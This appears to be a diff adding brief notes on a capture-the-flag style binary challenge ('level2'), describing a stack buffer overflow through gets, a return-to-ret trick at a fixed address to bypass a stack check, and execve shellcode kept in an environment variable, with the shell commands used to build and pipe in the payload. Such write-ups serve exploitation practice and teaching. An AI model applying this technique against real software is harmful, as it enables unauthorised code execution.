@@ -1,0 +1,36 @@
+
+################# BAD ###################
+#GOAL: Write shellcode in buffer.       #
+#      rewrite same EIP for p->main     #
+#	  write shellcode EIP for main->end #
+#########################################
+
+GOAL: export shellcode in env
+      jump to it via ret
+
+
+#> nm --defined-only -nr level2 | grep " T "
+T main
+T p
+
+main just calls p
+
+p has a buffer [0x4c]
+and calls gets
+can't overflow normaly because of stack mask cmp <+44>
+
+solution: make ret <+106> call himself
+          overflow -> Junk + 0x0804853e + SHELLCODE
+ret will put his self in eip, poping his address from the stack, thus putting our shellcode in eip on it's next call
+
+I tried to write the shellcode in the buffer but i couldn't manage to hit the memory window
+
+exporting it in env is safer, it will not move much between gdb and the shell
+
+GOOGLE: linux x86 shellcode execve
+
+#> export SHELLCODE=`python shellcode.py`
+
+#> python buffer.py > /tmp/bof
+
+#> cat /tmp/bof - | ./level2
